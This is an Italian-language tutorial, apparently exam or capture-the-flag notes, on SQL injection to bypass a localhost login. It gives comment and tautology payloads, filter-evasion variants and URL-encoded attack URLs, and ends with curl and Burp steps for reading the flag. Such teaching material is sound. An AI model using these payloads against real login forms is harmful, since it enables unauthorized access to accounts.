# Guida Pratica: SQL Injection (Auth Bypass & Filter Evasion)

## 1. Cos'è e Qual è l'Obiettivo
La SQL Injection per l'Authentication Bypass si verifica quando un form di login (o i parametri in un URL) concatena l'input dell'utente direttamente nella query del database senza sanificarlo.
L'obiettivo **NON** è estrarre dati, ma manipolare la logica della clausola `WHERE` per far credere al database che le credenziali siano corrette, garantendoti l'accesso (solitamente come `admin`).

Query vulnerabile classica:
`SELECT * FROM users WHERE username = '$username' AND password = '$password'`

---

## 2. La Regola d'Oro dell'URL Encoding
Quando attacchi un sito tramite la barra degli indirizzi (metodo GET), i caratteri speciali SQL (spazi, apici, trattini) "rompono" la richiesta HTTP e generano errori applicativi (es. HTTP 400 Bad Request). Devono essere sempre tradotti in URL-Encode.

**Cosa encodare:** SOLO il valore del payload.
* **Sbagliato:** Encodare `http://localhost/login?username=admin'--`
* **Corretto:** Prendi `admin' -- `, passalo allo script `./web_encoder.sh "admin' -- "` per ottenere `admin%27%20--%20`, e incollalo dopo l'uguale.

---

## 3. Metodologia: Il Workflow da Esame

### Step 1: Il Fuzzing (Cercare il punto di rottura)
Lo scopo qui non è loggarsi, ma capire **quale** parametro è vulnerabile. Inserisci un singolo apice `'` nei parametri.
* **URL di test:** `http://localhost:8000/login?username='&password='`
* **Analisi dell'errore (FONDAMENTALE):**
  * Se ricevi un banale "Credenziali errate", l'input potrebbe essere sanificato (es. tramite Regex o escape).
  * Se ricevi un errore di database (es. *OperationalError: unrecognized token* o *SQL syntax error*), **hai trovato il parametro vulnerabile**. Concentra l'attacco lì e lascia l'altro parametro con un valore innocuo (es. username=`admin`).

### Step 2: Tentativo Standard (Il Commento)
Una volta trovato il parametro vulnerabile (es. la password), tenta di chiudere la stringa e commentare via il resto della query.
* **Payload in chiaro:** `admin' -- ` *(nota lo spazio vitale dopo i trattini)*
* **Payload Encoded:** `admin%27%20--%20`
* **🔥 URL ESECUTIVO FINALE:** `http://localhost:8000/login?username=admin&password=a%27%20--%20` *(inseriamo 'a' per non lasciare il parametro username vuoto)*

### Step 3: L'Approccio Tautologico (Piano B)
Se i commenti non funzionano o la query è costruita in modo particolare, devi rendere la condizione matematicamente sempre VERA (Tautologia).
* **Payload in chiaro:** `' OR '1'='1`
* **Payload Encoded:** `%27%20OR%20%271%27%3D%271`
* **🔥 URL ESECUTIVO FINALE:** `http://localhost:8000/login?username=admin&password=%27%20OR%20%271%27%3D%271`

### Step 4: L'Evasione dei Filtri (Piano C - Ninja)
Se ricevi errori applicativi personalizzati ("OR is not allowed", "Illegal characters"), significa che c'è un filtro lato backend prima del database.

**Caso A: Filtro sulla parola "OR"**
Il Firewall blocca `OR`, ma il database SQL non fa distinzione tra maiuscole e minuscole.
* **Payload in chiaro:** `' oR '1'='1`
* **Payload Encoded:** `%27%20oR%20%271%27%3D%271`
* **🔥 URL ESECUTIVO FINALE:** `http://localhost:8000/login?username=admin&password=%27%20oR%20%271%27%3D%271`

**Caso B: Filtro sul simbolo di uguale "="**
Il Firewall blocca il simbolo `=`, devi usare una disuguaglianza logica comunque vera (es. 1 è maggiore di 0).
* **Payload in chiaro:** `' oR '1'>'0`
* **Payload Encoded:** `%27%20oR%20%271%27%3E%270`
* **🔥 URL ESECUTIVO FINALE:** `http://localhost:8000/login?username=admin&password=%27%20oR%20%271%27%3E%270`

---

## 4. Gestione del Redirect (Come leggere la Flag)
Spesso, dopo un login SQLi avvenuto con successo, il sito fa un "redirect" istantaneo verso la homepage, non dandoti il tempo di leggere la flag a schermo.

**Soluzioni per catturare la Flag:**
1. **Rete del Browser:** Premi F12, vai su "Rete/Network", spunta "Conserva Log" e lancia l'URL. Clicca sulla primissima risposta ricevuta (quella prima del redirect) per leggere l'HTML originale.
2. **Burp Suite:** Attiva l'intercept, invia l'URL dal browser, vai nella scheda "HTTP History", clicca sulla tua richiesta ed esamina il pannello "Response".
3. **Terminale (Curl):** Usa `curl` racchiudendo il tuo URL ESECUTIVO FINALE tra doppi apici e aggiungendo il flag `-s` per stampare a schermo l'HTML puro.
   *Esempio comando:* `curl -s "http://localhost:8000/login?username=admin&password=...ecc..."`